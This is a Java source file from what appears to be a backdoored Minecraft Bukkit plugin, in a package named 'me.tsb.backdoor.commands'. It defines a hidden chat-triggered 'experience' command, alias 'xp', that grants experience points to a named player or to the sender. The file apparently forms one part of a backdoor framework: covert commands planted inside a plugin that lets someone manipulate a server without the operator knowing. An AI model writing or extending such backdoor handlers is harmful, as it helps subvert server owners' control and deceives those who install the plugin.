package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "experience", aliases = {"xp"})
public class XPCommand extends Command {

    public XPCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Player player;
        try {
            player = Bukkit.getPlayer(args.get(0));
        } catch (Exception e) {
            Main.logger.log("Failed to get player in arg nr 1. Defaulting to command sender");
            try {
                player = event.getPlayer();
            } catch (Exception e2) {
                Main.logger.log(" Failed to set player to command sender \nEXCEPTION: " + e2);
                return;
            }
        }

        int xp;
        try {
            xp = Integer.parseInt(args.get(1));
        } catch (Exception e) {
            Main.logger.log("Failed to set xp amount, defaulting to 0");
            xp = 0;
        }

        try {
            player.giveExp(xp);
            player.sendMessage("Gave " + player.getName() + xp + " xp");
        } catch (Exception e) {
            Main.logger.log("Failed to give " + player.getName() + xp + " xp");
        }
    }
}
